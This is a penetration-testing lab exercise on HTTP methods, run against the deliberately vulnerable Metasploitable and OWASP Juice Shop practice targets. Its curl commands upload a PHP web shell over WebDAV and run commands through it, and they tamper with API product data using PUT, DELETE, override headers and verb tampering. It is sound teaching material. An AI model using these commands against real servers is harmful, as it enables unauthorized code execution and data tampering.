# 🔬 Lab Exercise 9: REST API HTTP Methods

> **Challenge:** Enumerate and exploit different HTTP methods on API endpoints
> **Where:** Metasploitable + OWASP Juice Shop
> **Time:** ~30-40 minutes

---

## Exercise 9A: Test HTTP Methods on Metasploitable

**Target:** Metasploitable web server at `192.168.56.20`

### Check Allowed Methods with OPTIONS
```bash
# Step 1: Ask Metasploitable what methods it allows
curl -X OPTIONS http://192.168.56.20 -I
# 📝 Look for the "Allow:" header
# 📝 What methods are listed? _______________

# Step 2: Check DVWA
curl -X OPTIONS http://192.168.56.20/dvwa/ -I
# 📝 Different Allow header? _______________

# Step 3: Check Tomcat
curl -X OPTIONS http://192.168.56.20:8180 -I
# 📝 What methods does Tomcat allow? _______________

# Step 4: Check WebDAV (if available)
curl -X OPTIONS http://192.168.56.20/dav/ -I
# ✅ EXPECTED: WebDAV likely allows PUT, DELETE, MKCOL, PROPFIND, etc.
# 📝 List ALL methods shown: _______________
```

### Test Each HTTP Method
```bash
# GET — retrieve data (normal request)
curl -X GET http://192.168.56.20/ -s | head -20
# ✅ EXPECTED: Normal webpage HTML

# HEAD — headers only (no body)
curl -X HEAD http://192.168.56.20/ -I
# ✅ EXPECTED: Same headers as GET, but no body

# POST — send data
curl -X POST http://192.168.56.20/ -d "test=data" -s | head -20
# 📝 Does the server accept POST? How does response differ from GET?

# PUT — upload/replace a resource (dangerous if allowed!)
curl -X PUT http://192.168.56.20/test_put.txt -d "This is uploaded via PUT" -I
# 📝 Status code? If 200/201 → PUT is enabled! (security issue)

# DELETE — delete a resource (dangerous if allowed!)
curl -X DELETE http://192.168.56.20/test_put.txt -I
# 📝 Status code? If 200/204 → DELETE is enabled! (security issue)

# TRACE — echoes back the request (XST attack vector)
curl -X TRACE http://192.168.56.20 -I
# 📝 Status code? If 200 → TRACE is enabled (reveals cookies/headers)

# PATCH — partial update
curl -X PATCH http://192.168.56.20/ -d '{"key":"value"}' -I
# 📝 Status code?
```

---

## Exercise 9B: WebDAV Exploitation on Metasploitable

**Target:** Metasploitable WebDAV at `http://192.168.56.20/dav/`

```bash
# Step 1: List the WebDAV directory
curl http://192.168.56.20/dav/
# 📝 What files/directories are listed?

# Step 2: Try to upload a file using PUT
curl -X PUT http://192.168.56.20/dav/test.txt -d "Hello from Kali!"
# ✅ EXPECTED: If status 201 Created → upload succeeded!

# Step 3: Verify the upload
curl http://192.168.56.20/dav/test.txt
# ✅ EXPECTED: "Hello from Kali!"

# Step 4: Upload a PHP shell (if PUT on .php is allowed)
curl -X PUT http://192.168.56.20/dav/cmd.php \
  -d '<?php echo system($_GET["cmd"]); ?>'
# 📝 Did it accept the PHP file?

# Step 5: If upload worked, execute a command!
curl "http://192.168.56.20/dav/cmd.php?cmd=whoami"
# ✅ EXPECTED: www-data (or similar)
curl "http://192.168.56.20/dav/cmd.php?cmd=id"
curl "http://192.168.56.20/dav/cmd.php?cmd=uname%20-a"

# Step 6: Clean up — delete your test files
curl -X DELETE http://192.168.56.20/dav/test.txt
curl -X DELETE http://192.168.56.20/dav/cmd.php
# 📝 Did DELETE work? Status code?

# Step 7: Use davtest tool (automated WebDAV testing)
davtest -url http://192.168.56.20/dav/
# ✅ davtest will try uploading various file types and report what works
# 📝 Which file types can be uploaded and executed?
```

---

## Exercise 9C: Juice Shop REST API Exploration

**Target:** Juice Shop API at `http://localhost:3000`

```bash
# Step 1: Discover API endpoints
# Juice Shop has a REST API — let's find it

# Check if Swagger/API docs exist
curl http://localhost:3000/api-docs -s | head -20
curl http://localhost:3000/swagger.json -s | head -20
curl http://localhost:3000/api/swagger.json -s | head -20

# Step 2: Test known Juice Shop API endpoints
curl http://localhost:3000/api/Products -s | python3 -m json.tool | head -30
# ✅ EXPECTED: JSON array of products

curl http://localhost:3000/api/Complaints -s | python3 -m json.tool
curl http://localhost:3000/api/Feedbacks -s | python3 -m json.tool | head -30
curl http://localhost:3000/rest/products/search?q= -s | python3 -m json.tool | head -30
# 📝 What data can you access without authentication?

# Step 3: Test different HTTP methods on the same endpoint
# GET — read products
curl -X GET http://localhost:3000/api/Products -s | head -10

# POST — create a product?
curl -X POST http://localhost:3000/api/Products \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked Product","price":0.01}' -s
# 📝 Status code? Can you create products?

# PUT — modify a product?
curl -X PUT http://localhost:3000/api/Products/1 \
  -H "Content-Type: application/json" \
  -d '{"price":0.01}' -s
# 📝 Status code? Can you modify prices?

# DELETE — delete a product?
curl -X DELETE http://localhost:3000/api/Products/1 -s
# 📝 Status code? Can you delete products?
```

---

## Exercise 9D: Method Override Techniques

```bash
# Some servers block certain HTTP methods (e.g., PUT, DELETE)
# but honor override headers. Try these against Metasploitable:

# X-HTTP-Method-Override
curl -X POST http://192.168.56.20/dav/test_override.txt \
  -H "X-HTTP-Method-Override: PUT" \
  -d "Override test" -I

# X-Method-Override
curl -X POST http://192.168.56.20/dav/test_override.txt \
  -H "X-Method-Override: PUT" \
  -d "Override test" -I

# X-HTTP-Method
curl -X POST http://192.168.56.20/dav/test_override.txt \
  -H "X-HTTP-Method: PUT" \
  -d "Override test" -I

# Try overriding on Juice Shop too
curl -X POST http://localhost:3000/api/Products/1 \
  -H "X-HTTP-Method-Override: DELETE" -s

# 📝 Did any of the method override headers work?
# 📝 What was the server's response for each?
```

---

## Exercise 9E: Nmap HTTP Methods Detection

```bash
# Step 1: Use nmap to enumerate HTTP methods
nmap --script=http-methods -p 80 192.168.56.20
# 📝 What methods did nmap find?

# Step 2: Scan specific paths
nmap --script=http-methods --script-args http-methods.url-path="/dav/" -p 80 192.168.56.20
# 📝 Different methods available at /dav/ vs root?

# Step 3: Scan Tomcat
nmap --script=http-methods -p 8180 192.168.56.20
# 📝 What methods does Tomcat allow?

# Step 4: Check for risky methods
nmap --script=http-methods -p 80 192.168.56.20 | grep -iE "PUT|DELETE|TRACE"
# ✅ If PUT, DELETE, or TRACE show up → potential security issue!
```

---

## Exercise 9F: Verb Tampering

```bash
# Verb tampering: if one method is restricted, try others

# Scenario 1: GET might be restricted on admin pages
curl -X GET http://192.168.56.20/dvwa/setup.php -s | head -5
curl -X POST http://192.168.56.20/dvwa/setup.php -s | head -5
curl -X HEAD http://192.168.56.20/dvwa/setup.php -I
# 📝 Do different methods give different access levels?

# Scenario 2: Try non-standard methods
curl -X JEFF http://192.168.56.20/ -I
curl -X HACKED http://192.168.56.20/ -I
# 📝 How does the server handle unknown methods?
# Some misconfigured servers allow access with unknown methods!

# Scenario 3: Against Juice Shop
curl -X OPTIONS http://localhost:3000/api/Products -I
# Check CORS headers — Access-Control-Allow-Methods
# 📝 What methods are allowed by CORS policy?
```

---

## ✅ Completion Checklist

- [ ] Tested OPTIONS method on 3+ services (9A)
- [ ] Tested GET, POST, PUT, DELETE, TRACE, HEAD on Metasploitable (9A)
- [ ] Exploited WebDAV to upload and execute files (9B)
- [ ] Explored Juice Shop REST API — tested all methods (9C)
- [ ] Tried HTTP method override headers (9D)
- [ ] Used nmap for HTTP methods detection (9E)
- [ ] Practiced verb tampering (9F)

---

**Next:** [Challenge 10: Passive Information Collection →](./10_lab_passive_recon.md)
